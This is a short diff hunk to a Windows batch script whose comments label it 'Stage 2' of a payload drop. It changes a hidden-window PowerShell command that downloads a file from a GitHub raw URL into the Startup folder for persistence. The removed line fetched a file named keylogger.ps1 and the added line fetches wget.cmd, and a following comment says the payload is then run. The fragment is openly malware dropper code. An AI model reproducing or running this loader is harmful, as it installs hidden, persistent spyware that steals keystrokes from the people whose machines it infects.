@@ -10,7 +10,7 @@ cd %STARTUP%
 @REM Begin the Stage 2
 
 @REM Write payload to Startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Kuper-xx/Perseus/refs/heads/main/files/keylogger.ps1' -Outfile 'wget.cmd'"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Kuper-xx/Perseus/refs/heads/main/files/wget.cmd' -Outfile 'wget.cmd'"
 
 
 @REM Run payload
